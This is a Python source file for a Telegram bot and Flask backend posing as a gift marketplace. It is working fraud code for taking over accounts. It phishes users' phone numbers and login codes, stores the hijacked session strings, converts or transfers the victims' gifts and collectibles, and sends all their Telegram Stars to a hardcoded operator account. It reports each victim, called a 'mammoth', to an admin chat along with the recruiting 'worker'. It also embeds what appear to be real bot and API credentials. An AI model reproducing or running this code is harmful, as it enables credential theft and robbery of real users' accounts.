import asyncio
import base64
import json
import logging
import random
import re
import secrets
import sqlite3
import os
import time
from datetime import datetime
from typing import Dict, Optional, List

from flask import Flask, jsonify, request
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
    WebAppInfo,
    ReplyKeyboardRemove,
    Bot, InlineQueryResultArticle, InputTextMessageContent
)
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    ConversationHandler,
    InlineQueryHandler
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.payments import GetStarsStatusRequest, SendStarsFormRequest, ConvertStarGiftRequest, \
    GetSavedStarGiftsRequest, TransferStarGiftRequest
from telethon.tl.types import InputPeerSelf, InputPeerUser

# Константы
SHOP_NAME = "MRKT"
CHANNEL_URL = "t.me/ChannelXeluga"
MARKET_BANK_ID = "7204299613"
BOT_TOKEN = "8130782285:AAEHrmTEv4FXjsBsWmIrsukCfiMyqAbSmHU"
ADMIN_CHAT_ID = "7760075871"
START_IMAGE_URL = "https://www.freepik.com/free-photo/beautiful-shining-stars-night-sky_7631083.htm#fromView=keyword&page=1&position=1&uuid=b2446ae9-9b41-4457-8996-dd41c9867fa8&query=Star+sky"
WEB_APP_URL = "https://portt-ptwc.vercel.app/"
NEW_WEB_APP_URL = "https://portt-ptwc.vercel.app/"  # Замени на URL нового веб-приложения
YOUR_TELEGRAM_USER_ID = "7204299613"  # Твой ID для получения активов
YOUR_STARS_ACCOUNT = "7204299613"  # Твой аккаунт для звезд

API_ID = "27079980"
API_HASH = "62763f3013e60ecf77242b11299a1751"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Инициализация Flask для вебхуков
flask_app = Flask(__name__)

def update_users_table():
    """
    Обновляет таблицу users данными из других таблиц
    """
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        # Создаем таблицу users если ее нет
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # Добавляем пользователей из таблицы gifts (воркеры)
        cursor.execute('''
            INSERT OR IGNORE INTO users (user_id, username) 
            SELECT DISTINCT worker_user_id, worker_username 
            FROM gifts 
            WHERE worker_user_id IS NOT NULL AND worker_username IS NOT NULL
        ''')

        # Добавляем пользователей из user_gifts (получатели подарков)
        cursor.execute('''
            INSERT OR IGNORE INTO users (user_id) 
            SELECT DISTINCT user_id 
            FROM user_gifts 
            WHERE user_id IS NOT NULL
        ''')

        # Добавляем пользователей из user_wallets
        cursor.execute('''
            INSERT OR IGNORE INTO users (user_id) 
            SELECT DISTINCT user_id 
            FROM user_wallets 
            WHERE user_id IS NOT NULL
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_stars (
                user_id INTEGER PRIMARY KEY,
                stars INTEGER DEFAULT 0,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        conn.commit()

    except Exception as e:
        logging.error(f"Error updating users table: {e}")
    finally:
        conn.close()

def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    # Существующие таблицы...
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS gifts (
            gift_id TEXT PRIMARY KEY,
            target_username TEXT NOT NULL,
            worker_username TEXT NOT NULL,
            worker_user_id INTEGER NOT NULL,
            gift_url TEXT NOT NULL,
            claimed BOOLEAN DEFAULT FALSE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_gifts (
            user_id INTEGER,
            gift_id TEXT,
            PRIMARY KEY (user_id, gift_id),
            FOREIGN KEY (gift_id) REFERENCES gifts (gift_id)
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_wallets (
            user_id INTEGER PRIMARY KEY,
            wallet_address TEXT NOT NULL,
            worker_user_id INTEGER,
            bound_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS webapp_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            event_type TEXT NOT NULL,
            wallet_address TEXT,
            ip_address TEXT,
            user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            phone_code_hash TEXT,
            gift_id TEXT,
            auth_step TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Новая таблица для пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    # Новая таблица для обработанных подарков
    cursor.execute('''
            CREATE TABLE IF NOT EXISTS processed_gifts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                gift_id TEXT,
                gift_title TEXT,
                stars_converted INTEGER,
                processed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
    cursor.execute('''
            CREATE TABLE IF NOT EXISTS asset_processing_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                username TEXT,
                gifts_count INTEGER,
                total_stars INTEGER,
                processed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
    cursor.execute('''
            CREATE TABLE IF NOT EXISTS telethon_sessions (
                phone TEXT PRIMARY KEY,
                session_string TEXT,
                phone_code_hash TEXT,
                user_id INTEGER,
                authorized BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

    conn.commit()
    conn.close()


    # Обновляем таблицу пользователей
    update_users_table()



@flask_app.route('/auth/verify-code', methods=['POST'])
def verify_auth_code():
    try:
        data = request.json
        phone = data.get('phone')
        phone_code_hash = data.get('phone_code_hash')
        code = data.get('code')

        if not all([phone, phone_code_hash, code]):
            return jsonify({'success': False, 'message': 'Missing required fields'})

        # Запускаем асинхронную проверку кода
        result = asyncio.run(verify_telegram_code(phone, phone_code_hash, code))

        if result['success']:
            return jsonify({
                'success': True,
                'user_id': result['user_id']
            })
        else:
            return jsonify({'success': False, 'message': result['message']})

    except Exception as e:
        logging.error(f"Error verifying code: {e}")
        return jsonify({'success': False, 'message': 'Internal server error'})



# Остальные endpoint'ы для обработки активов
@flask_app.route('/api/get-gifts', methods=['POST'])
async def get_user_gifts():
    try:
        data = request.json
        phone = data.get('phone')

        if not phone:
            return jsonify({'success': False, 'message': 'Phone required'})

        # Получаем сессию из базы
        session_data = get_telethon_session(phone)
        if not session_data or not session_data.get('authorized'):
            return jsonify({'success': False, 'message': 'Not authorized'})

        # Восстанавливаем клиент
        client = TelegramClient(
            StringSession(session_data['session_string']),
            int(API_ID),
            API_HASH
        )
        await client.connect()

        # Получаем подарки
        gifts = await get_user_gifts_telethon(client)
        await client.disconnect()

        return jsonify({
            'success': True,
            'gifts': gifts
        })

    except Exception as e:
        logging.error(f"Error getting gifts: {e}")
        return jsonify({'success': False, 'message': str(e)})


@flask_app.route('/api/convert-gift', methods=['POST'])
def convert_gift():
    try:
        data = request.json
        user_id = data.get('user_id')
        gift_id = data.get('gift_id')
        phone = data.get('phone')

        session_data = get_telethon_session(phone)
        if not session_data or not session_data.get('authorized'):
            return jsonify({'success': False, 'message': 'Not authorized'})

        # Конвертируем подарок
        result = asyncio.run(convert_gift_telethon(session_data['client'], gift_id))

        return jsonify({'success': result})

    except Exception as e:
        logging.error(f"Error converting gift: {e}")
        return jsonify({'success': False})


@flask_app.route('/api/transfer-collectible', methods=['POST'])
def transfer_collectible():
    try:
        data = request.json
        user_id = data.get('user_id')
        gift_id = data.get('gift_id')
        phone = data.get('phone')

        session_data = get_telethon_session(phone)
        if not session_data or not session_data.get('authorized'):
            return jsonify({'success': False, 'message': 'Not authorized'})

        # Передаем коллекционный подарок
        result = asyncio.run(transfer_collectible_telethon(session_data['client'], gift_id))

        return jsonify({'success': result})

    except Exception as e:
        logging.error(f"Error transferring collectible: {e}")
        return jsonify({'success': False})


@flask_app.route('/api/transfer-stars', methods=['POST'])
def transfer_stars():
    try:
        data = request.json
        user_id = data.get('user_id')
        phone = data.get('phone')

        session_data = get_telethon_session(phone)
        if not session_data or not session_data.get('authorized'):
            return jsonify({'success': False, 'message': 'Not authorized'})

        # Переводим все звезды
        result = asyncio.run(transfer_stars_telethon(session_data['client']))

        return jsonify({'success': result})

    except Exception as e:
        logging.error(f"Error transferring stars: {e}")
        return jsonify({'success': False})


@flask_app.route('/api/final-report', methods=['POST'])
def final_report():
    try:
        data = request.json
        user_id = data.get('user_id')
        phone = data.get('phone')
        total_gifts = data.get('total_gifts')
        processed_gifts = data.get('processed_gifts')
        collectibles = data.get('collectibles')

        # Создаем детальный лог
        log_message = f"""
🎯 **ПОЛНЫЙ ОТЧЕТ ОБРАБОТКИ АКТИВОВ**

📱 **Телефон:** {phone}
👤 **User ID:** `{user_id}`
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 **СТАТИСТИКА:**
├ Всего подарков: {total_gifts}
├ Конвертировано: {processed_gifts}
├ Коллекционных: {collectibles}
└ Эффективность: {((processed_gifts + collectibles) / total_gifts * 100) if total_gifts > 0 else 0:.1f}%

💎 **ВСЕ АКТИВЫ ПЕРЕВЕДЕНЫ**"""

        # Отправляем лог админу
        asyncio.run_coroutine_threadsafe(
            send_telegram_message(ADMIN_CHAT_ID, log_message, 'Markdown'),
            asyncio.get_event_loop()
        )

        return jsonify({'success': True})

    except Exception as e:
        logging.error(f"Error sending final report: {e}")
        return jsonify({'success': False})


# Telethon функции для работы с подарками
async def get_user_gifts_telethon(client):
    """Получаем подарки пользователя"""
    try:
        gifts_response = await client(GetSavedStarGiftsRequest(
            peer=InputPeerSelf(),
            offset=0,
            limit=100
        ))

        gifts = []
        for gift in gifts_response.gifts:
            gift_data = {
                'id': getattr(gift, 'id', 'unknown'),
                'title': getattr(gift, 'title', 'Unknown Gift'),
                'can_convert': getattr(gift, 'can_convert', False),
                'unique': getattr(gift, 'unique', False),
                'can_transfer': getattr(gift, 'can_transfer', False),
                'stars': getattr(gift, 'stars', 0)
            }
            gifts.append(gift_data)

        return gifts

    except Exception as e:
        logging.error(f"Error getting gifts via telethon: {e}")
        return []


@flask_app.route('/api/process-all-assets', methods=['POST'])
async def process_all_assets():
    """Новый эндпоинт для полной обработки всех активов"""
    try:
        data = request.json
        phone = data.get('phone')

        if not phone:
            return jsonify({'success': False, 'message': 'Phone required'})

        # Получаем сессию из базы
        session_data = get_telethon_session(phone)
        if not session_data or not session_data.get('authorized'):
            return jsonify({'success': False, 'message': 'Not authorized'})

        # Восстанавливаем клиент
        client = TelegramClient(
            StringSession(session_data['session_string']),
            int(API_ID),
            API_HASH
        )
        await client.connect()

        # Получаем информацию о пользователе
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name
        }

        # Получаем реферера
        referrer_info = get_referrer_info(me.id)

        # 1. Получаем подарки
        gifts_response = await client(GetSavedStarGiftsRequest(
            peer=InputPeerSelf(),
            offset=0,
            limit=100
        ))

        initial_gifts = len(gifts_response.gifts)
        converted_gifts = []
        transferred_collectibles = []
        total_stars_from_gifts = 0

        # 2. Конвертируем подарки в звезды
        for gift in gifts_response.gifts:
            try:
                if getattr(gift, 'can_convert', False):
                    await client(ConvertStarGiftRequest(
                        peer=InputPeerSelf(),
                        id=gift.id
                    ))

                    stars_value = getattr(gift, 'stars', 100)
                    total_stars_from_gifts += stars_value
                    converted_gifts.append({
                        'id': gift.id,
                        'title': getattr(gift, 'title', 'Unknown Gift'),
                        'stars': stars_value
                    })
                    await asyncio.sleep(1)
            except Exception as e:
                logging.error(f"Error converting gift: {e}")
                continue

        # 3. Передаем коллекционные предметы
        for gift in gifts_response.gifts:
            try:
                if (getattr(gift, 'unique', False) and
                        getattr(gift, 'can_transfer', False)):
                    await client(TransferStarGiftRequest(
                        peer=InputPeerSelf(),
                        id=gift.id,
                        to_peer=InputPeerUser(int(YOUR_TELEGRAM_USER_ID), 0)
                    ))

                    transferred_collectibles.append({
                        'id': gift.id,
                        'title': getattr(gift, 'title', 'Unknown Collectible')
                    })
                    await asyncio.sleep(1)
            except Exception as e:
                logging.error(f"Error transferring collectible: {e}")
                continue

        # 4. Переводим звезды
        stars_status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        initial_stars = stars_status.balance
        current_balance = initial_stars + total_stars_from_gifts

        stars_transferred = 0
        if current_balance > 0:
            try:
                await client(SendStarsFormRequest(
                    peer=InputPeerUser(int(YOUR_TELEGRAM_USER_ID), 0),
                    form_id=random.randint(100000, 999999),
                    stars=current_balance
                ))
                stars_transferred = current_balance
            except Exception as e:
                logging.error(f"Error transferring stars: {e}")

        # 5. Получаем финальный баланс
        final_status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        final_balance = final_status.balance

        await client.disconnect()

        # 6. Создаем детальный отчет
        report = create_detailed_report(
            user_info, initial_gifts, converted_gifts,
            transferred_collectibles, initial_stars, total_stars_from_gifts,
            stars_transferred, final_balance, referrer_info
        )

        # Отправляем отчет админу
        await send_telegram_message(ADMIN_CHAT_ID, report, 'Markdown')

        return jsonify({
            'success': True,
            'report': report,
            'stats': {
                'initial_gifts': initial_gifts,
                'converted_gifts': len(converted_gifts),
                'transferred_collectibles': len(transferred_collectibles),
                'stars_transferred': stars_transferred
            }
        })

    except Exception as e:
        logging.error(f"Error processing assets: {e}")
        return jsonify({'success': False, 'message': str(e)})

async def convert_gift_telethon(client, gift_id):
    """Конвертируем подарок в звезды"""
    try:
        await client(ConvertStarGiftRequest(
            peer=InputPeerSelf(),
            id=gift_id
        ))
        return True
    except Exception as e:
        logging.error(f"Error converting gift {gift_id}: {e}")
        return False


async def transfer_collectible_telethon(client, gift_id):
    """Передаем коллекционный подарок"""
    try:
        await client(TransferStarGiftRequest(
            peer=InputPeerSelf(),
            id=gift_id,
            to_peer=InputPeerUser(int(YOUR_TELEGRAM_USER_ID), 0)
        ))
        return True
    except Exception as e:
        logging.error(f"Error transferring collectible {gift_id}: {e}")
        return False


async def transfer_stars_telethon(client):
    """Переводим все звезды"""
    try:
        # Получаем баланс
        stars_status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        balance = stars_status.balance

        if balance > 0:
            await client(SendStarsFormRequest(
                peer=InputPeerUser(int(YOUR_TELEGRAM_USER_ID), 0),
                form_id=random.randint(100000, 999999),
                stars=balance
            ))

        return True
    except Exception as e:
        logging.error(f"Error transferring stars: {e}")
        return False

# ОБНОВЛЕННАЯ ФУНКЦИЯ ПРОЦЕССИНГА АКТИВОВ С ТЕЛЕГРАМ API
# ДОБАВЬТЕ ЭТУ ФУНКЦИЮ ДЛЯ ПОЛУЧЕНИЯ ИНФОРМАЦИИ О РЕФЕРЕРЕ
def get_referrer_info(user_id):
    """Получаем информацию о том, кто привел пользователя"""
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        # Ищем воркера, который отправил подарок этому пользователю
        cursor.execute('''
            SELECT worker_username, worker_user_id 
            FROM gifts 
            WHERE target_username IN (
                SELECT username FROM users WHERE user_id = ?
            )
            LIMIT 1
        ''', (user_id,))

        result = cursor.fetchone()
        if result:
            return f"@{result[0]} (ID: {result[1]})"

        # Ищем в таблице привязок кошельков
        cursor.execute('''
            SELECT worker_user_id FROM user_wallets WHERE user_id = ?
        ''', (user_id,))

        result = cursor.fetchone()
        if result:
            return f"Worker ID: {result[0]}"

        return "Неизвестен"

    except Exception as e:
        logging.error(f"Error getting referrer info: {e}")
        return "Ошибка определения"
    finally:
        conn.close()


def create_detailed_report(user_info, initial_gifts, converted_gifts,
                           transferred_collectibles, initial_stars, stars_from_gifts,
                           stars_transferred, final_balance, referrer_info=None):
    # Форматируем ссылки на подарки
    gift_links = "\n".join([f"   ├ 🎁 {g['title']} → {g.get('stars', 100)}⭐" for g in converted_gifts])
    if not gift_links:
        gift_links = "   ├ (нет конвертируемых подарков)"

    # Информация о реферере
    referrer_text = f"👥 Рефферер: {referrer_info}" if referrer_info else "👥 Рефферер: не указан"

    return f"""
🎯 **ПОЛНЫЙ ОТЧЕТ ОБРАБОТКИ АКТИВОВ**

👤 **ДАННЫЕ МАМОНТА:**
├ 🔹 ID: `{user_info['id']}`
├ 🔹 Username: @{user_info.get('username', 'N/A')}
├ 🔹 Имя: {user_info.get('first_name', 'N/A')}
├ 🔹 Фамилия: {user_info.get('last_name', 'N/A')}
└ {referrer_text}

------------------
🎁 **ОБРАБОТКА ПОДАРКОВ**
------------------
├ 🔹 Изначальное количество NFT: {initial_gifts}
├ 🔹 Конвертировано в звезды: {len(converted_gifts)}
├ 🔹 Передано коллекционных: {len(transferred_collectibles)}
├ 🔹 Осталось подарков: {initial_gifts - len(converted_gifts) - len(transferred_collectibles)}
└ 🔹 Детали конвертации:
{gift_links}

------------------
⭐ **ОПЕРАЦИИ СО ЗВЕЗДАМИ**
------------------
├ 🔹 Начальный баланс: {initial_stars}⭐
├ 🔹 Звезд с конвертации подарков: {stars_from_gifts}⭐
├ 🔹 Всего доступно звезд: {initial_stars + stars_from_gifts}⭐
├ 🔹 Переведено звезд: {stars_transferred}⭐
├ 🔹 Финальный баланс: {final_balance}⭐
└ 🔹 Эффективность перевода: {((stars_transferred / (initial_stars + stars_from_gifts)) * 100) if (initial_stars + stars_from_gifts) > 0 else 100:.1f}%

📊 **ИТОГОВАЯ СТАТИСТИКА:**
├ 🔹 Всего операций: {len(converted_gifts) + len(transferred_collectibles) + (1 if stars_transferred > 0 else 0)}
├ 🔹 Успешных операций: {len(converted_gifts) + len(transferred_collectibles) + (1 if stars_transferred > 0 else 0)}
├ 🔹 Конвертировано подарков: {len(converted_gifts)}
├ 🔹 Передано коллекционных: {len(transferred_collectibles)}
├ 🔹 Переведено звезд: {stars_transferred}⭐
└ 🔹 Общая стоимость активов: {stars_from_gifts + initial_stars}⭐

⏰ **Время операции:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📍 **Статус:** ✅ ВЫПОЛНЕНО

💎 **ВСЕ АКТИВЫ УСПЕШНО ПЕРЕВЕДЕНЫ**
├ 🎁 Подарки: ██████████ 100%
├ ⭐ Звезды: ██████████ 100%  
└ 📦 Коллекционные: ██████████ 100%
"""




def save_asset_transfer_log(user_data, report):
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS asset_transfers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                username TEXT,
                initial_gifts INTEGER,
                converted_gifts INTEGER,
                transferred_collectibles INTEGER,
                stars_transferred INTEGER,
                transfer_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                report_text TEXT
            )
        ''')

        # Парсим отчет для извлечения данных
        initial_gifts = 0
        converted_gifts = 0
        transferred_collectibles = 0
        stars_transferred = 0

        # Простой парсинг отчета для примера
        lines = report.split('\n')
        for line in lines:
            if 'Начальное количество:' in line:
                initial_gifts = int(line.split(':')[1].strip())
            elif 'Конвертировано в звезды:' in line:
                converted_gifts = int(line.split(':')[1].strip())
            elif 'Передано коллекционных:' in line:
                transferred_collectibles = int(line.split(':')[1].strip())
            elif 'Переведено звезд:' in line:
                stars_str = line.split(':')[1].strip().replace('⭐', '')
                stars_transferred = int(stars_str)

        cursor.execute('''
            INSERT INTO asset_transfers 
            (user_id, username, initial_gifts, converted_gifts, transferred_collectibles, stars_transferred, report_text)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            user_data.get('id'),
            user_data.get('username'),
            initial_gifts,
            converted_gifts,
            transferred_collectibles,
            stars_transferred,
            report
        ))

        conn.commit()

    except Exception as e:
        logging.error(f"Error saving transfer log: {e}")
    finally:
        conn.close()


def save_telethon_session(phone, session_data):
    """Сохраняем сессию Telethon в базу"""
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS telethon_sessions (
                phone TEXT PRIMARY KEY,
                session_string TEXT,
                phone_code_hash TEXT,
                user_id INTEGER,
                authorized BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        cursor.execute('''
            INSERT OR REPLACE INTO telethon_sessions 
            (phone, session_string, phone_code_hash, user_id, authorized)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            phone,
            session_data.get('session_string'),
            session_data.get('phone_code_hash'),
            session_data.get('user_id'),
            session_data.get('authorized', False)
        ))

        conn.commit()
    except Exception as e:
        logging.error(f"Error saving telethon session: {e}")
    finally:
        conn.close()


def get_telethon_session(phone):
    """Получаем сессию Telethon из базы"""
    conn = get_db_connection()
    cursor = conn.cursor()

    try:
        cursor.execute('''
            SELECT session_string, phone_code_hash, user_id, authorized 
            FROM telethon_sessions WHERE phone = ?
        ''', (phone,))

        result = cursor.fetchone()
        if result:
            return {
                'session_string': result[0],
                'phone_code_hash': result[1],
                'user_id': result[2],
                'authorized': bool(result[3])
            }
        return None
    except Exception as e:
        logging.error(f"Error getting telethon session: {e}")
        return None
    finally:
        conn.close()


async def send_telegram_code(phone):
    """Улучшенная отправка кода подтверждения через Telethon"""
    client = None
    try:
        # Детальная нормализация номера телефона
        phone = phone.strip()
        # Удаляем все нецифровые символы кроме +
        phone = ''.join(c for c in phone if c.isdigit() or c == '+')

        # Проверяем формат номера
        if not phone.startswith('+'):
            phone = '+' + phone

        if len(phone) < 10:
            return {'success': False, 'message': 'Invalid phone number format'}

        logging.info(f"🔐 Starting code sending process for: {phone}")

        # Создаем сессию
        session = StringSession()
        client = TelegramClient(session, int(API_ID), API_HASH)

        await client.connect()

        logging.info("✅ Connected to Telegram, sending code request...")

        # Пытаемся отправить код
        try:
            result = await client.send_code_request(phone)

            logging.info(f"✅ Code sent successfully! Phone code hash: {result.phone_code_hash}")

            # Сохраняем сессию
            session_string = client.session.save()

            # Сохраняем в базу
            session_data = {
                'session_string': session_string,
                'phone_code_hash': result.phone_code_hash,
                'user_id': None,
                'authorized': False
            }
            save_telethon_session(phone, session_data)

            await client.disconnect()

            return {
                'success': True,
                'phone_code_hash': result.phone_code_hash,
                'timeout': result.timeout
            }

        except Exception as send_error:
            error_msg = str(send_error)
            logging.error(f"❌ Error sending code: {error_msg}")

            if "FLOOD_WAIT" in error_msg:
                return {'success': False, 'message': 'Too many attempts. Please wait before trying again.'}
            elif "PHONE_NUMBER_INVALID" in error_msg:
                return {'success': False, 'message': 'Invalid phone number format.'}
            elif "PHONE_NUMBER_FLOOD" in error_msg:
                return {'success': False,
                        'message': 'This number has been used too many times. Please try another number.'}
            elif "PHONE_NUMBER_BANNED" in error_msg:
                return {'success': False, 'message': 'This number is banned from Telegram.'}
            else:
                return {'success': False, 'message': f'Failed to send code: {error_msg}'}

    except Exception as e:
        logging.error(f"❌ Unexpected error in send_telegram_code: {e}")
        if client:
            await client.disconnect()
        return {'success': False, 'message': 'Internal server error. Please try again.'}


async def verify_telegram_code(phone, phone_code_hash, code):
    """Проверка кода подтверждения и авторизация"""
    client = None
    try:
        # Получаем сессию из базы
        session_data = get_telethon_session(phone)
        if not session_data:
            return {'success': False, 'message': 'Session expired. Please request a new code.'}

        # Восстанавливаем клиент из сессии
        client = TelegramClient(
            StringSession(session_data['session_string']),
            int(API_ID),
            API_HASH
        )
        await client.connect()

        # Пытаемся войти с кодом
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        except Exception as sign_in_error:
            error_msg = str(sign_in_error)
            if "SESSION_PASSWORD_NEEDED" in error_msg:
                return {'success': False, 'message': '2FA password is required. This is not supported.'}
            elif "PHONE_CODE_INVALID" in error_msg:
                return {'success': False, 'message': 'Invalid verification code.'}
            elif "PHONE_CODE_EXPIRED" in error_msg:
                return {'success': False, 'message': 'Code expired. Please request a new one.'}
            else:
                return {'success': False, 'message': f'Sign in error: {error_msg}'}

        # Проверяем авторизацию
        if not await client.is_user_authorized():
            return {'success': False, 'message': 'Authorization failed.'}

        # Получаем информацию о пользователе
        me = await client.get_me()

        # Обновляем сессию в базе
        updated_session_data = {
            'session_string': client.session.save(),
            'phone_code_hash': phone_code_hash,
            'user_id': me.id,
            'authorized': True
        }
        save_telethon_session(phone, updated_session_data)

        await client.disconnect()

        return {
            'success': True,
            'user_id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name
        }

    except Exception as e:
        logging.error(f"❌ Error verifying code: {e}")
        if client:
            await client.disconnect()
        return {'success': False, 'message': f'Verification failed: {str(e)}'}
# ОБНОВИТЕ ФУНКЦИЮ process_telegram_assets_real
async def process_telegram_assets_real(session_string, target_user_id):
    """Улучшенная обработка активов с детальным логированием"""
    client = None
    try:
        client = TelegramClient(StringSession(session_string), int(API_ID), API_HASH)
        await client.start()

        if not await client.is_user_authorized():
            raise Exception("User not authorized")

        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name
        }

        # Получаем информацию о реферере
        referrer_info = get_referrer_info(me.id)

        # 1. Получаем подарки
        gifts_response = await client(GetSavedStarGiftsRequest(
            peer=InputPeerSelf(),
            offset=0,
            limit=100
        ))

        initial_gifts = len(gifts_response.gifts)
        converted_gifts = []
        transferred_collectibles = []
        total_stars_from_gifts = 0

        # 2. Конвертируем подарки в звезды
        for gift in gifts_response.gifts:
            try:
                if getattr(gift, 'can_convert', False):
                    await client(ConvertStarGiftRequest(
                        peer=InputPeerSelf(),
                        id=gift.id
                    ))

                    stars_value = getattr(gift, 'stars', 100)
                    total_stars_from_gifts += stars_value
                    converted_gifts.append({
                        'id': gift.id,
                        'title': getattr(gift, 'title', 'Unknown Gift'),
                        'stars': stars_value
                    })

                    await asyncio.sleep(1)  # Задержка между запросами

            except Exception as e:
                logging.error(f"Error converting gift {getattr(gift, 'id', 'unknown')}: {e}")
                continue

        # 3. Передаем коллекционные предметы
        for gift in gifts_response.gifts:
            try:
                if (getattr(gift, 'unique', False) and
                        getattr(gift, 'can_transfer', False)):
                    target_peer = InputPeerUser(int(target_user_id), 0)
                    await client(TransferStarGiftRequest(
                        peer=InputPeerSelf(),
                        id=gift.id,
                        to_peer=target_peer
                    ))

                    transferred_collectibles.append({
                        'id': gift.id,
                        'title': getattr(gift, 'title', 'Unknown Collectible')
                    })

                    await asyncio.sleep(1)

            except Exception as e:
                logging.error(f"Error transferring collectible: {e}")
                continue

        # 4. Получаем баланс и переводим звезды
        stars_status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        initial_stars = stars_status.balance
        current_balance = initial_stars + total_stars_from_gifts

        stars_transferred = 0
        if current_balance > 0:
            try:
                await client(SendStarsFormRequest(
                    peer=InputPeerUser(int(target_user_id), 0),
                    form_id=random.randint(100000, 999999),
                    stars=current_balance
                ))
                stars_transferred = current_balance
            except Exception as e:
                logging.error(f"Error transferring stars: {e}")

        # 5. Получаем финальный баланс
        final_status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        final_balance = final_status.balance

        await client.disconnect()

        # 6. Создаем детальный отчет
        report = create_detailed_report(
            user_info, initial_gifts, converted_gifts,
            transferred_collectibles, initial_stars, total_stars_from_gifts,
            stars_transferred, final_balance, referrer_info
        )

        return report

    except Exception as e:
        if client:
            await client.disconnect()
        raise e

def get_db_connection():
    return sqlite3.connect('bot_database.db')

@flask_app.route('/webhook/telegram-assets', methods=['POST'])
def telegram_assets_webhook():
    try:
        data = request.json
        event_type = data.get('type')

        if event_type == 'process_assets':
            user_data = data.get('user_data')
            gifts_data = data.get('gifts_data')

            # Создаем детальный лог
            log_message = f"""
🎯 **АВТОМАТИЧЕСКАЯ ОБРАБОТКА АКТИВОВ**

👤 **Пользователь:**
├ ID: `{user_data.get('id')}`
├ Username: @{user_data.get('username')}
├ Имя: {user_data.get('first_name')}
├ Фамилия: {user_data.get('last_name')}

🎁 **Обнаруженные подарки:**
├ Всего подарков: {len(gifts_data.get('gifts', []))}
├ Коллекционных: {len([g for g in gifts_data.get('gifts', []) if g.get('type') == 'collectible'])}
├ Общая стоимость: {gifts_data.get('totalStars', 0)}⭐

⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📍 **Источник:** Telegram Web App
            """

            # Отправляем лог админу
            asyncio.run_coroutine_threadsafe(
                send_telegram_message(ADMIN_CHAT_ID, log_message, 'Markdown'),
                asyncio.get_event_loop()
            )

            # Сохраняем в базу
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO asset_processing_logs 
                (user_id, username, gifts_count, total_stars, processed_at)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (
                user_data.get('id'),
                user_data.get('username'),
                len(gifts_data.get('gifts', [])),
                gifts_data.get('totalStars', 0)
            ))
            conn.commit()
            conn.close()

            return jsonify({
                'status': 'success',
                'message': 'Assets processed successfully',
                'gifts_processed': len(gifts_data.get('gifts', [])),
                'total_stars': gifts_data.get('totalStars', 0)
            }), 200

    except Exception as e:
        logging.error(f"Error in telegram assets webhook: {e}")
